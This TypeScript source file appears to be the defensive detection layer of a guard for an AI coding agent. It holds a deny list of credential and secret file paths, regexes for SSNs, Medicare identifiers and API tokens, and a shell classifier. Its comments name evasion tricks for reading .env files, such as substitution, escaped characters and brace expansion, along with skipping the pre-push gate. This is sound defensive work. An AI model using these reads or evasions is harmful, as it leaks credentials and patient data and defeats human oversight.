/**
 * ChartWarden agent harness — the pure detection rules behind the Claude Code hooks.
 * --------------------------------------------------------------------------------
 * Three questions, each answered by a pure function so the tests can drive every shape directly:
 *
 *   1. `secretPathReason(path)`    — is this a file an agent must never read or write (live env files,
 *                                    keys, database dumps)?
 *   2. `scanContent(text, reg)`    — does this text carry a real-looking identifier (SSN, MBI) or a
 *                                    credential? Synthetic identifiers live in
 *                                    `compliance/synthetic-identifiers.json`; everything else is refused.
 *   3. `classifyBash(cmd, ctx)`    — should this shell command run, need a human, or be refused?
 *
 * These are guard rails for a cooperative agent, not a sandbox: a determined process can always open a
 * file the regexes did not anticipate. The real controls stay where they are (RLS, the pre-push gate,
 * CI). What this layer buys is that the ordinary failure — an agent `cat`-ing `.env` to "check the
 * config", pasting a realistic SSN into a fixture, or `--no-verify`-ing past the fitness gate under
 * deadline — is stopped at the moment it happens, with a reason the agent can act on.
 *
 * Never put a matched value into a reason or a ledger line: findings carry a REDACTED sample only.
 */
import { userInfo } from "node:os";

import { execCommandWrites, findActions } from "./find-expr";
import { globMatches, globTokens } from "./glob";
import { switchesHarness } from "./harness-switch";
import {
  SHELL_PROGRAM,
  type ScriptStage,
  inlineScriptText,
  mayWriteFileOperands,
  printedText,
  readsScriptFromStdin,
  runsInlineCode,
  scriptsHandedToShell,
} from "./inline-code";
import { type LongOption, optionValues } from "./option-values";
import { relativeTo } from "./path-alias";
import { environmentLeak, reachesLiveEnv, storedSecretVerdict } from "./secret-reads";
import {
  BARE,
  COMMENT,
  CONT,
  type Segment,
  type SplitCommand,
  substitutions as lexSubstitutions,
  scanShell,
  splitCommand,
} from "./shell-lex";
import { isToolchainPath } from "./toolchain-paths";
import {
  RUNS_COMMAND_STRING,
  WRAPPER_OPERANDS,
  WRAPPER_VALUE_FLAG,
  containerExec,
  containerRun,
  shellStrings,
  sshHost,
} from "./wrappers";
import { extraOutputFiles, localPath } from "./writers";

export interface SyntheticRegistry {
  readonly ssn: ReadonlySet<string>;
  readonly mbi: ReadonlySet<string>;
}

export function registryFrom(json: {
  ssn?: readonly string[];
  mbi?: readonly string[];
}): SyntheticRegistry {
  return {
    ssn: new Set((json.ssn ?? []).map((s) => s.replace(/-/g, ""))),
    mbi: new Set((json.mbi ?? []).map((s) => s.replace(/-/g, "").toUpperCase())),
  };
}

export const EMPTY_REGISTRY: SyntheticRegistry = { ssn: new Set(), mbi: new Set() };

// ---------------------------------------------------------------------------------------------------
// 1. Secret paths
// ---------------------------------------------------------------------------------------------------

/** Committed templates that merely LOOK like secret files. */
const TEMPLATE_SUFFIX = /\.(example|sample|template|dist)$/i;

const SECRET_PATH_RULES: ReadonlyArray<readonly [RegExp, string]> = [
  [
    /(^|\/)\.env(\.[^/]*)?$/i,
    "a live environment file (database URLs, BETTER_AUTH_SECRET, vendor keys)",
  ],
  // `deploy/production/backend.env`-style files; not `env.ts`.
  [
    /(^|\/)[^/]+\.env(\.(local|development|staging|production|tenant))?$/i,
    "a live environment file",
  ],
  [/\.(pem|key|p12|pfx|jks|keystore)$/i, "a private key or keystore"],
  [/(^|\/)id_(rsa|ecdsa|ed25519|dsa)(\.pub)?$/i, "an SSH key"],
  [/(^|\/)\.(pgpass|netrc|npmrc|pypirc)$/i, "a credentials file"],
  // `/i`: macOS and Windows resolve `.SSH/config` and `.AWS/credentials` to the same files.
  [/(^|\/)\.ssh\//i, "the SSH configuration directory"],
  [/(^|\/)\.aws\/credentials$/i, "cloud credentials"],
  [/(^|\/)\.gnupg\//i, "the GnuPG key directory"],
  [/(^|\/)\.docker\/config\.json$/i, "registry credentials"],
  [
    /(^|\/)(\.codex\/auth\.json|\.claude\/\.credentials\.json|\.config\/gh\/hosts\.yml|\.git-credentials|\.kube\/config)$/i,
    "a coding-agent, GitHub, git or cluster credentials file",
  ],
  // A secrets/ directory — but source files that merely live under a `secrets/` module are code.
  [/(^|\/)\.?secrets?\/(?!.*\.(ts|tsx|js|mjs|cjs|md)$)/i, "a secrets directory"],
  [/\.(dump|sql\.gz|sql\.zst|backup|bak)$/i, "a database dump or backup (may hold PHI)"],
  [/(^|\/)(pgbackrest|backups?)\/.*\.(gz|zst|lz4|tar)$/i, "a backup archive (may hold PHI)"],
  [/\.env\.bak(\.|$)/i, "a backup of a live environment file"],
];

/** Returns why `path` is off-limits to an agent, or null when it is fine. */
export function secretPathReason(path: string): string | null {
  const p = path.replace(/\\/g, "/");
  if (TEMPLATE_SUFFIX.test(p)) return null;
  for (const [re, why] of SECRET_PATH_RULES) if (re.test(p)) return why;
  return null;
}

// ---------------------------------------------------------------------------------------------------
// 2. Content: PHI-shaped identifiers and credentials
// ---------------------------------------------------------------------------------------------------

export type FindingKind =
  | "ssn"
  | "mbi"
  | "private-key"
  | "cloud-key"
  | "vendor-token"
  | "db-url-password"
  | "high-entropy-secret"
  /** Larger than {@link MAX_SCAN_CHARS}: not scanned, so it is not vouched for either. */
  | "unscannable";

export interface Finding {
  readonly kind: FindingKind;
  readonly line: number;
  /** Length only — no characters of the value, not even a prefix (an SSN's last four are the sensitive part). */
  readonly sample: string;
}

const redact = (v: string): string => `${v.length} chars`;

const SSN_DASHED = /\b(\d{3})-(\d{2})-(\d{4})\b/g;
const SSN_KEYED = /\bssn\b[^0-9\n]{0,6}(\d{3}[- ]?\d{2}[- ]?\d{4})\b/gi;
// CMS MBI format: C A AN N A AN N A A N N — letters exclude S L O I B Z. Upper-case only (MBIs are
// upper-case by spec, and a case-insensitive match would trip on hex hashes).
const MBI_L = "[AC-HJKMNP-RT-Y]";
const MBI_AN = "[AC-HJKMNP-RT-Y0-9]";
const MBI = new RegExp(
  `(?<![A-Za-z0-9])[1-9]${MBI_L}${MBI_AN}[0-9]-?${MBI_L}${MBI_AN}[0-9]-?${MBI_L}${MBI_L}[0-9]{2}(?![A-Za-z0-9])`,
  "g",
);

/** SSA never issues area 000, 666 or 900-999, group 00 or serial 0000 — those are synthetic by definition. */
export function ssnNeverIssued(area: string, group: string, serial: string): boolean {
  return (
    area === "000" || area === "666" || area.startsWith("9") || group === "00" || serial === "0000"
  );
}

const CREDENTIAL_RULES: ReadonlyArray<readonly [RegExp, FindingKind]> = [
  // A real key body is hundreds of base64 characters; a test's `-----BEGIN PRIVATE KEY-----\nMIIB\n-----END`
  // stub is not a credential.
  [
    /-----BEGIN (?:RSA |EC |DSA |OPENSSH |PGP |ENCRYPTED )?PRIVATE KEY(?: BLOCK)?-----[A-Za-z0-9+/=\s\\n]{200,}/g,
    "private-key",
  ],
  // AWS's own documentation key (…EXAMPLE) is excluded.
  [/\b(?:AKIA|ASIA)(?![0-9A-Z]{9}EXAMPLE)[0-9A-Z]{16}\b/g, "cloud-key"],
  [/\bgh[pousr]_[A-Za-z0-9]{36,}\b/g, "vendor-token"],
  [/\bgithub_pat_[A-Za-z0-9_]{60,}\b/g, "vendor-token"],
  [/\bxox[abprs]-[A-Za-z0-9-]{20,}\b/g, "vendor-token"],
  [/\b(?:sk|rk)_live_[A-Za-z0-9]{20,}\b/g, "vendor-token"],
  [/\bsk-ant-[A-Za-z0-9_-]{30,}\b/g, "vendor-token"],
  [/\bsk-(?:proj-)?[A-Za-z0-9_-]{40,}\b/g, "vendor-token"],
];

/** A postgres URL carrying an inline password for a host that is not local/compose-internal. */
// Every quantifier is bounded: an unbounded `[^@\s]+` backtracks to the end of the text from each
// `postgres://x:` start (quadratic), and the guard fails OPEN on a timeout.
const DB_URL = /\bpostgres(?:ql)?:\/\/[^:\s/@]{1,64}:([^@\s]{1,256})@([^/:\s?#'"`]{1,255})/g;
// Local means loopback, the Docker host alias, or a service this repo's docker-compose.yml names. A bare
// single-label name or a `*.internal` suffix is NOT local: production hosts look exactly like that.
const LOCAL_HOST_RE =
  /^(localhost|127(\.\d{1,3}){3}|\[?::1\]?|0\.0\.0\.0|host\.docker\.internal|[a-z0-9-]+\.localhost|\/.*)$/i;
/** Service names in docker-compose.yml (reachable only on the private compose network). */
export const COMPOSE_SERVICES: ReadonlySet<string> = new Set([
  "postgres",
  "redis",
  "minio",
  "clamav",
  "migrate",
  "api",
  "worker",
  "docling-worker",
  "provision-gateway",
]);
const LOCAL_HOST = {
  test: (h: string): boolean => LOCAL_HOST_RE.test(h) || COMPOSE_SERVICES.has(h.toLowerCase()),
};
const PLACEHOLDER =
  /^(\$\{?[A-Z_]+\}?|<[^>]+>|\*+|x+|\.{1,3}|\u2026|.{1,3}|password|postgres|changeme|secret|pass|chartwarden(-(local|dev|test|ci|e2e)[A-Za-z0-9_-]*)?)$/i;

/** `SECRET=...`-style assignment with a long, high-entropy literal. Applied to non-test paths only. */
const KEYED_SECRET =
  /\b[A-Z0-9_]{0,64}(?:SECRET|TOKEN|PASSWORD|PASSWD|API_KEY|PRIVATE_KEY)[A-Z0-9_]{0,64}\s{0,8}[:=]\s{0,8}["'`]?([A-Za-z0-9+/=_.-]{32,})["'`]?/g;

export function shannonEntropy(s: string): number {
  const counts = new Map<string, number>();
  for (const c of s) counts.set(c, (counts.get(c) ?? 0) + 1);
  let h = 0;
  for (const n of counts.values()) {
    const p = n / s.length;
    h -= p * Math.log2(p);
  }
  return h;
}

/** Paths whose content is never scanned (lockfiles, binary-ish corpora, the registry itself). */
const UNSCANNED =
  /(^|\/)(bun\.lock|package-lock\.json|pnpm-lock\.yaml|yarn\.lock)$|\.(pdf|png|jpe?g|gif|webp|ico|woff2?|ttf|zip|gz|pen)$|^HOPE Data Spec|(^|\/)compliance\/synthetic-identifiers\.json$/i;
const TESTISH =
  /(__tests__|__fixtures__|\.test\.|\.spec\.|\/fixtures?\/|\.stories\.|\.example$|^e2e\/)/;

export function isScannable(path: string): boolean {
  return !UNSCANNED.test(path.replace(/\\/g, "/"));
}

// ponytail: one memo for the text being scanned; the hook is a one-shot process. Counting newlines from the
// start for every finding made a 1 MB patch of findings take 14 s, and the guard fails OPEN past Codex's timeout.
let lineStarts: { readonly text: string; readonly starts: readonly number[] } | undefined;
function lineOf(text: string, index: number): number {
  if (lineStarts?.text !== text) {
    const starts = [0];
    for (let i = 0; i < text.length; i++) if (text.charCodeAt(i) === 10) starts.push(i + 1);
    lineStarts = { text, starts };
  }
  const { starts } = lineStarts;
  let lo = 0;
  let hi = starts.length - 1;
  while (lo < hi) {
    const mid = (lo + hi + 1) >> 1;
    if ((starts[mid] ?? 0) <= index) lo = mid;
    else hi = mid - 1;
  }
  return lo + 1;
}

/**
 * Largest text one scan will take. Every rule here is linear in the input (the keyed-secret rule bounds
 * its prefix and suffix), so this is a second line, not the first: content past it is REFUSED by the
 * callers that write (the guard) and reported as skipped by the ones that read (phi-scan, Stop gate).
 */
export const MAX_SCAN_CHARS = 8_000_000;

export function scanContent(text: string, registry: SyntheticRegistry, path = ""): Finding[] {
  if (path && !isScannable(path)) return [];
  if (text.length > MAX_SCAN_CHARS) {
    return [{ kind: "unscannable", line: 1, sample: redact(text) }];
  }
  const out: Finding[] = [];
  const push = (kind: FindingKind, index: number, value: string) =>
    out.push({ kind, line: lineOf(text, index), sample: redact(value) });

  for (const m of text.matchAll(SSN_DASHED)) {
    const [whole, a = "", g = "", s = ""] = m;
    if (ssnNeverIssued(a, g, s) || registry.ssn.has(a + g + s)) continue;
    push("ssn", m.index ?? 0, whole);
  }
  for (const m of text.matchAll(SSN_KEYED)) {
    if (/^\d{3}-\d{2}-\d{4}$/.test(m[1] ?? "")) continue; // the dashed rule above already judged it
    const v = (m[1] ?? "").replace(/\D/g, "");
    if (ssnNeverIssued(v.slice(0, 3), v.slice(3, 5), v.slice(5)) || registry.ssn.has(v)) continue;
    push("ssn", m.index ?? 0, v);
  }
  for (const m of text.matchAll(MBI)) {
    const v = m[0].replace(/-/g, "");
    if (registry.mbi.has(v)) continue;
    push("mbi", m.index ?? 0, v);
  }
  for (const [re, kind] of CREDENTIAL_RULES)
    for (const m of text.matchAll(re)) push(kind, m.index ?? 0, m[0]);
  for (const m of text.matchAll(DB_URL)) {
    const pw = m[1] ?? "";
    const host = m[2] ?? "";
    if (LOCAL_HOST.test(host) || PLACEHOLDER.test(pw)) continue;
    // A short dummy in a test file (`p@ss`) is a fixture; a real-length password is flagged everywhere.
    if (TESTISH.test(path) && pw.length < 8) continue;
    push("db-url-password", m.index ?? 0, pw);
  }
  if (!TESTISH.test(path)) {
    for (const m of text.matchAll(KEYED_SECRET)) {
      const v = m[1] ?? "";
      if (PLACEHOLDER.test(v) || shannonEntropy(v) < 4.0) continue;
      push("high-entropy-secret", m.index ?? 0, v);
    }
  }
  return out;
}

const CHUNK_CHARS = 4_000_000;

/**
 * {@link scanContent} for FILES that may exceed one scan's limit (a generated 12 MB OpenAPI document):
 * scanned in line-aligned chunks so size alone never exempts a file. A single line past the limit is
 * still reported as `unscannable`.
 */
export function scanLarge(text: string, registry: SyntheticRegistry, path = ""): Finding[] {
  if (text.length <= MAX_SCAN_CHARS) return scanContent(text, registry, path);
  const out: Finding[] = [];
  let start = 0;
  let lineBase = 0;
  while (start < text.length) {
    let end = Math.min(start + CHUNK_CHARS, text.length);
    if (end < text.length) {
      const nl = text.indexOf("\n", end);
      end = nl < 0 ? text.length : nl + 1;
    }
    const chunk = text.slice(start, end);
    for (const f of scanContent(chunk, registry, path)) out.push({ ...f, line: f.line + lineBase });
    for (let i = chunk.indexOf("\n"); i >= 0; i = chunk.indexOf("\n", i + 1)) lineBase++;
    start = end;
  }
  return out;
}

export function describeFindings(path: string, findings: readonly Finding[]): string {
  const kinds = [...new Set(findings.map((f) => f.kind))];
  const where = findings
    .slice(0, 5)
    .map((f) => `${path}:${f.line} (${f.kind}, ${f.sample})`)
    .join("; ");
  const phi = kinds.some((k) => k === "ssn" || k === "mbi");
  const advice = phi
    ? "Use a value from compliance/synthetic-identifiers.json, or an SSN with area 000/666/9xx. Adding a new synthetic value to that file is a human decision."
    : kinds.includes("unscannable")
      ? "This content is too large to scan, so it cannot be vouched for. Write it in smaller pieces, or keep it out of the repo."
      : "Credentials never go in the repo: read them from the environment (OpenBao in production) and put a placeholder in the .example template.";
  return `${kinds.join(", ")} found — ${where}. ${advice}`;
}

// ---------------------------------------------------------------------------------------------------
// 3. Shell commands
// ---------------------------------------------------------------------------------------------------

export type Decision = "allow" | "ask" | "deny";

export interface BashVerdict {
  readonly decision: Decision;
  readonly reason: string;
}

export interface BashContext {
  /** Current branch, used to treat a bare `git push` / `git push origin HEAD` on main as a push to main. */
  readonly branch?: string;
  /** Does this (cwd-relative) path exist? Lets `cat tls.key` be refused while `jq '.key'` is not. */
  readonly exists?: (path: string) => boolean;
  /** Absolute repo root, so an absolute path to a protected file is judged like the relative one. */
  readonly root?: string;
  /** Directory the command starts in (hook input `cwd`); relative targets resolve against it. Default: the root. */
  readonly cwd?: string;
  /** The user's home directory, so `~`, `$HOME` and the expanded `/Users/me/...` agree. Default: `$HOME`. */
  readonly home?: string;
  /** Wall-clock budget for judging one command, in ms (default 1000); past it the answer is ask. A test seam. */
  readonly judgeTimeLimitMs?: number;
}

/**
 * Split a command line into simple commands on `;`, `&&`, `||`, `|`, `&` and newlines, outside quotes,
 * escapes, comments, substitutions and heredoc bodies. The lexer is `shell-lex.ts`; a heredoc body is data
 * unless what it feeds runs it as a script (a shell, `eval`, `source`, or a pipeline into one).
 */
const splitSegments = (cmd: string): SplitCommand => splitCommand(cmd, readsShellScript);

const segments = (cmd: string): string[] => splitSegments(cmd).parts.map((p) => p.text);

/**
 * The text inside every `$( … )`, `<( … )`, `>( … )` and backtick pair that the shell would actually run
 * (single quotes make them literal). Each one is judged as its own command line, so `echo $(cat .env)` is
 * the `cat`.
 */
function substitutions(cmd: string): string[] {
  return lexSubstitutions(cmd, MAX_SUBSTITUTIONS + 1);
}

/** `bash -c "…"`, `sh -c '…'`, `eval …`: the quoted string is itself a command line. */
const NESTED_SHELL = SHELL_PROGRAM;

/**
 * Shell words, keeping a quoted string as one word (quotes stripped), also INSIDE a word: in
 * `FOO='a b' git push` the value is one word, so the program is still `git`. Splitting at the space
 * inside the quotes read `b'` as the program and let the whole command through unchecked.
 */
// A `$( … )` or backtick substitution stays INSIDE its word (`cat $(printf '.%s' env)` is one `cat` with
// one argument), and bash's `$'\x2eenv'` is decoded, because the shell would.
const ANSI_ESCAPES: Readonly<Record<string, string>> = { n: "\n", t: "\t", r: "\r" };

/** The text bash makes of the body of `$'…'`: `\x2e`, `\056`, `.` and the common one-letter escapes. */
function ansiC(body: string): string {
  return body.replace(
    /\\(?:x([0-9a-fA-F]{1,2})|([0-7]{1,3})|u([0-9a-fA-F]{1,4})|U([0-9a-fA-F]{1,8})|(.))/gs,
    (_m, x?: string, o?: string, u?: string, big?: string, ch?: string) => {
      const hex = x ?? u ?? big;
      const code = hex !== undefined ? Number.parseInt(hex, 16) : Number.parseInt(o ?? "", 8);
      if (hex !== undefined || o !== undefined) {
        return Number.isFinite(code) && code <= 0x10ffff ? String.fromCodePoint(code) : "";
      }
      return ANSI_ESCAPES[ch ?? ""] ?? ch ?? "";
    },
  );
}

/** Index of the next unescaped `'` at or after `from` (the end of a `$'…'` body), or the text length. */
function closingQuote(text: string, from: number): number {
  for (let i = from; i < text.length; i++) {
    if (text[i] === "\\") i++;
    else if (text[i] === "'") return i;
  }
  return text.length;
}

function words(seg: string): string[] {
  const out: string[] = [];
  let cur = "";
  let started = false;
  let quote: string | null = null;
  let depth = 0; // inside `$( … )`
  let tick = false; // inside `…`
  for (let i = 0; i < seg.length; i++) {
    const ch = seg[i] as string;
    if (tick || depth > 0) {
      cur += ch;
      if (tick) tick = ch !== "`";
      else if (ch === "(") depth++;
      else if (ch === ")") depth--;
      continue;
    }
    if (quote === "'") {
      if (ch === "'") quote = null;
      else cur += ch;
      continue;
    }
    if (ch === "`" || (ch === "$" && seg[i + 1] === "(")) {
      started = true;
      if (ch === "`") tick = true;
      else {
        depth = 1;
        cur += "$";
        i++;
      }
      cur += seg[i];
      continue;
    }
    if (quote === '"') {
      if (ch === '"') quote = null;
      else if (ch === "\\" && i + 1 < seg.length) cur += ch + seg[++i];
      else cur += ch;
      continue;
    }
    if (ch === "$" && seg[i + 1] === "'") {
      const end = closingQuote(seg, i + 2);
      cur += ansiC(seg.slice(i + 2, end));
      started = true;
      i = end;
    } else if (ch === '"' || ch === "'") {
      quote = ch;
      started = true;
    } else if (/\s/.test(ch)) {
      if (started) out.push(cur);
      cur = "";
      started = false;
    } else if (ch === "\\" && i + 1 < seg.length) {
      cur += ch + seg[++i];
      started = true;
    } else {
      cur += ch;
      started = true;
    }
  }
  if (started) out.push(cur);
  return out;
}

const ASSIGNMENT = /^[A-Za-z_][A-Za-z0-9_]*=/;
// Words that run the NEXT word as the command. Each takes its own value-carrying flags (`sudo -u root`,
// `nice -n 5`, `xargs -I{}`), which must not be read as the program. Shell keywords (`then`, `do`) are in
// the list because `if x; then rm …; fi` splits into a `then rm …` segment.
const NO_FLAG_VALUE = /^$/;
const WRAPPER_FLAG_VALUE: ReadonlyMap<string, RegExp> = new Map([
  ...WRAPPER_VALUE_FLAG,
  ...[
    "time",
    "command",
    "builtin",
    "nohup",
    "setsid",
    "then",
    "do",
    "else",
    "elif",
    "if",
    "while",
    "until",
    "!",
  ].map((w): [string, RegExp] => [w, NO_FLAG_VALUE]),
]);

/**
 * `env -C DIR cmd`, `env --chdir=DIR cmd`, `sudo -D DIR cmd`: the wrapper runs the command in DIR, so a relative
 * target of that command is relative to DIR. Matches the flag and, when it carries its own value, captures it.
 */
const CHDIR_FLAG: ReadonlyMap<string, RegExp> = new Map([
  ["env", /^(?:-C|--chdir)$/],
  ["sudo", /^(?:-D|--chdir)$/],
]);
const CHDIR_ATTACHED: ReadonlyMap<string, RegExp> = new Map([
  ["env", /^(?:-C(.+)|--chdir=(.*))$/s],
  ["sudo", /^(?:-D(.+)|--chdir=(.*))$/s],
]);

/**
 * The program a simple command runs, skipping `VAR=value` prefixes and wrapper commands (`sudo`, `env`, `then`).
 * A name the shell would unquote (`\cd`, `c\d`) is the program it names. `chdir` is the directory a wrapper moves
 * the command into, when it names one.
 */
function program(seg: string): {
  prog: string;
  args: string[];
  assigns: string[];
  chdir?: string;
} {
  const w = words(seg);
  let k = 0;
  let lastWrapper = "";
  let chdir: string | undefined;
  while (k < w.length) {
    const word = w[k] ?? "";
    const bare = unescapeWord(word);
    if (/^g?timeout$/.test(bare.replace(/^.*\//, ""))) {
      lastWrapper = "timeout";
      k++;
      while (k < w.length) {
        const option = w[k] ?? "";
        if (option === "--") {
          k++;
          break;
        }
        if (/^(?:-s|-k|--signal|--kill-after)$/.test(option)) {
          k += 2;
          continue;
        }
        if (/^--(?:signal|kill-after)=/.test(option) || /^-/.test(option)) {
          k++;
          continue;
        }
        break;
      }
      // GNU and BSD timeout both place one duration operand before the child command.
      if (k < w.length) k++;
      continue;
    }
    const takesValue = WRAPPER_FLAG_VALUE.get(bare);
    if (ASSIGNMENT.test(word)) k++;
    else if (takesValue && k + 1 < w.length) {
      // `flock -c 'cmd' file`: the string is the command, so the wrapper stays the program and its string is read.
      if (
        RUNS_COMMAND_STRING.has(bare) &&
        w.slice(k + 1).some((x) => /^-c$|^--command(?:=|$)/.test(x))
      ) {
        break;
      }
      lastWrapper = bare;
      k++;
      const operands = WRAPPER_OPERANDS.get(bare);
      let supplied = false;
      while (k < w.length && /^-/.test(w[k] ?? "") && (w[k] ?? "") !== "--") {
        const flag = w[k] ?? "";
        supplied ||= operands?.suppliedBy?.test(flag) ?? false;
        const attached = CHDIR_ATTACHED.get(bare)?.exec(flag);
        if (attached) chdir = attached[1] ?? attached[2] ?? "";
        else if (CHDIR_FLAG.get(bare)?.test(flag)) chdir = w[k + 1] ?? "";
        // `--chdir DIR` takes its value from the next word as `-C DIR` does.
        k += takesValue.test(flag) || flag === "--chdir" ? 2 : 1;
      }
      // `sudo -- rm x`: `--` ends the wrapper's options, and the command follows it.
      if (w[k] === "--") k++;
      // `flock lockfile cmd`, `chrt -f 1 cmd`, `taskset 0x1 cmd`: operands before the command.
      if (operands && !supplied) k += operands.count;
    } else break;
  }
  // `env -u X` with no command prints the environment: it is still `env`.
  const prog =
    k >= w.length && lastWrapper === "env" ? "env" : unescapeWord(w[k] ?? "").replace(/^.*\//, "");
  return {
    prog,
    args: prog === "env" && k >= w.length ? [] : w.slice(k + 1),
    assigns: w.slice(0, k).filter((x) => ASSIGNMENT.test(x)),
    ...(chdir === undefined ? {} : { chdir }),
  };
}

/** The redirections of one simple command, pulled out so they are not mistaken for its arguments. */
interface Redirects {
  /** The command with every redirection removed. */
  readonly rest: string;
  /** Targets written to: `> f`, `>> f`, `2>f`, `&>f`, `>|f`. */
  readonly outs: string[];
  /** Files read: `< f`, `<> f`. */
  readonly ins: string[];
  /** Here-doc delimiters and here-string words: input the command is handed inline. */
  readonly docs: string[];
  /** The here-string words alone (`<<< 'text'`). */
  readonly strings: string[];
}

const REDIRECT_OPERATOR = /(?:>>|>\||>&|<<<|<<-?|<&|<>|>|<)/y;
const FD_DUP = /\d+-?|-/y;

/** Read one shell word starting at `from` (the lexer's mask says what is quoted); returns its raw text and end. */
function readWord(text: string, from: number, kind: Uint8Array): { word: string; end: number } {
  let i = from;
  while (i < text.length && /\s/.test(text[i] as string)) i++;
  const start = i;
  for (; i < text.length; i++) {
    if (kind[i] === BARE && /[\s;|&<>()]/.test(text[i] as string)) break;
  }
  return { word: text.slice(start, i), end: i };
}

/** Length of the `2` in `2>f` or the `&` in `&>f` just before the operator at `at`: it belongs to the operator. */
function fdPrefixLength(seg: string, at: number): number {
  let k = 0;
  while (k < at && /[0-9]/.test(seg[at - 1 - k] as string)) k++;
  if (k === 0 && seg[at - 1] === "&") k = 1;
  const before = seg[at - 1 - k];
  return k > 0 && (before === undefined || /\s/.test(before)) ? k : 0;
}

function splitRedirects(seg: string): Redirects {
  if (!/[<>]/.test(seg)) return { rest: seg, outs: [], ins: [], docs: [], strings: [] };
  // The segment has its heredoc body taken out already, so `<<` reads as an ordinary operator here.
  const { kind } = scanShell(seg, false);
  let rest = "";
  const outs: string[] = [];
  const ins: string[] = [];
  const docs: string[] = [];
  const strings: string[] = [];
  for (let i = 0; i < seg.length; i++) {
    const ch = seg[i] as string;
    const k = kind[i];
    if (k === COMMENT || k === CONT) continue;
    // Only a bare `<` or `>` is a redirection: a quoted, escaped or substituted one is part of a word.
    if (k !== BARE || (ch !== ">" && ch !== "<")) {
      rest += ch;
      continue;
    }
    REDIRECT_OPERATOR.lastIndex = i;
    const op = REDIRECT_OPERATOR.exec(seg)?.[0] ?? ch;
    const fd = fdPrefixLength(seg, i);
    i += op.length - 1;
    rest = `${fd > 0 ? rest.slice(0, rest.length - fd) : rest} `;
    if (op.endsWith("&")) {
      FD_DUP.lastIndex = i + 1;
      const dup = FD_DUP.exec(seg)?.[0];
      if (dup !== undefined) {
        i += dup.length;
        continue;
      }
    }
    const { word, end } = readWord(seg, i + 1, kind);
    i = end - 1;
    const target = words(word)[0] ?? "";
    if (op === "<<<") strings.push(target);
    // `<>` opens its file for reading AND writing.
    if (op === "<>") outs.push(target);
    (op.startsWith("<<") ? docs : op.startsWith(">") ? outs : ins).push(target);
  }
  return { rest, outs, ins, docs, strings };
}

interface Parsed {
  readonly prog: string;
  /** The directory a wrapper (`env -C`, `sudo -D`) runs the command in, as written. */
  readonly chdir?: string;
  readonly args: string[];
  readonly assigns: string[];
  readonly outs: string[];
  readonly ins: string[];
  readonly docs: string[];
  readonly strings: string[];
}

/** Program, arguments and redirections of one simple command. */
function parseSegment(seg: string): Parsed {
  const { rest, outs, ins, docs, strings } = splitRedirects(seg);
  return { ...program(rest), outs, ins, docs, strings };
}

/**
 * Does this command run text it is handed on stdin (a heredoc, or a pipe) as a shell script? A shell, `eval`,
 * `source`/`.`, `at`/`batch`, or any of those named as an argument (`docker exec -i c sh <<EOF`). Such a
 * heredoc body is a script to judge line by line; every other body is text (`git commit -F - <<EOF`).
 * Interpreters (`python3 -`, `node -`) are not here: their body is read as text by `scriptTextVerdict`.
 */
const SCRIPT_READER = /^(eval|source|\.|at|batch)$/;
function readsShellScript(segment: string): boolean {
  const parsed = parseSegment(segment);
  // `$SHELL <<EOF`, `$(which sh) <<EOF`: a program the guard cannot name may be a shell.
  if (/[$`]/.test(parsed.prog)) return true;
  return [parsed.prog, ...parsed.args].some((word) => {
    const name = word.replace(/^.*\//, "");
    return NESTED_SHELL.test(name) || SCRIPT_READER.test(name);
  });
}

const MAX_BRACE_ALTERNATIVES = 256;
const MAX_BRACE_GROUPS = 16;

/**
 * What ONE command may spend. The 64 KB cap bounds the text, not the work: 1,300 words that each expand to 256
 * brace alternatives, judged against 16 candidate directories, are five million path resolutions (12 s), and
 * the hook is killed at 10 s and the call then runs. So brace alternatives and path resolutions draw on a
 * budget that `classifyBash` refills for each command and that every nested `$( )` and `bash -c` shares. Past
 * it nothing more is expanded or resolved (a resolution answers "unknown directory"), and the command asks.
 */
const MAX_COMMAND_BRACE_ALTERNATIVES = 4096;
const MAX_COMMAND_PATH_RESOLUTIONS = 16_384;
/** Text judged across the command and everything nested in it (`$( )`, `bash -c`, `eval`): four times the 64 KB command cap. */
const MAX_COMMAND_JUDGED_CHARS = 256 * 1024;
/** A word longer than a path can be (PATH_MAX) is not a file name, so its braces are not expanded. */
const MAX_BRACE_WORD_CHARS = 4096;
/**
 * Wall-clock backstop for one `classifyBash`. The hook is killed at 10 s and Claude Code then runs the call, and
 * the guard judges a command twice when the root or cwd is a symlink, so each judging gets a second.
 */
const MAX_COMMAND_JUDGE_MS = 1000;
const WORK_BUDGET_REASON =
  "This command has too many brace alternatives, path targets or nested commands, or is too big, for the guard to check in time (the work grows with each word times each directory a `cd` may have left it in, and with every command nested in another). Split it into smaller commands, or let a human run it.";
const freshWork = (limitMs: number) => ({
  braces: MAX_COMMAND_BRACE_ALTERNATIVES,
  resolutions: MAX_COMMAND_PATH_RESOLUTIONS,
  chars: MAX_COMMAND_JUDGED_CHARS,
  deadline: performance.now() + limitMs,
  spent: false,
});
let work = freshWork(MAX_COMMAND_JUDGE_MS);
const refillWork = (limitMs: number): void => {
  work = freshWork(limitMs);
};
/** Has this command used up its time? Marks the budget spent, so the command asks. */
function outOfTime(): boolean {
  if (!work.spent && performance.now() > work.deadline) work.spent = true;
  return work.spent;
}

/**
 * The first `{a,b}` group in `word` that has no brace inside it, split into the text before, its body and
 * the text after; null when there is none. One pass: a regex for this backtracks quadratically on `{,,,,`.
 */
function firstBraceGroup(word: string): { pre: string; body: string; post: string } | null {
  let open = -1;
  let comma = false;
  for (let i = 0; i < word.length; i++) {
    const ch = word[i];
    if (ch === "{") {
      open = i;
      comma = false;
    } else if (ch === ",") comma ||= open >= 0;
    else if (ch === "}") {
      if (open >= 0 && comma) {
        return { pre: word.slice(0, open), body: word.slice(open + 1, i), post: word.slice(i + 1) };
      }
      open = -1;
      comma = false;
    }
  }
  return null;
}

/** Bash brace expansion of one word: `.en{v,}` is `.env` and `.en`. Bounded, so it cannot be made to blow up. */
function expandBraces(word: string): string[] {
  if (word.length > MAX_BRACE_WORD_CHARS) return [word];
  let out = [word];
  for (let round = 0; round < MAX_BRACE_GROUPS; round++) {
    const next: string[] = [];
    let changed = false;
    for (const w of out) {
      const group = next.length >= MAX_BRACE_ALTERNATIVES ? null : firstBraceGroup(w);
      if (group && work.braces <= 0) work.spent = true; // a group is left unexpanded
      if (!group || work.braces <= 0) {
        next.push(w);
        continue;
      }
      changed = true;
      const alternatives = group.body.split(",");
      work.braces -= alternatives.length;
      for (const alt of alternatives) next.push(`${group.pre}${alt}${group.post}`);
    }
    out = next;
    if (!changed) break;
  }
  return out;
}

/** What the shell does to a word before the program sees it: remove backslashes, expand braces. */
const unescapeWord = (t: string): string => t.replace(/\\(.)/gs, "$1");

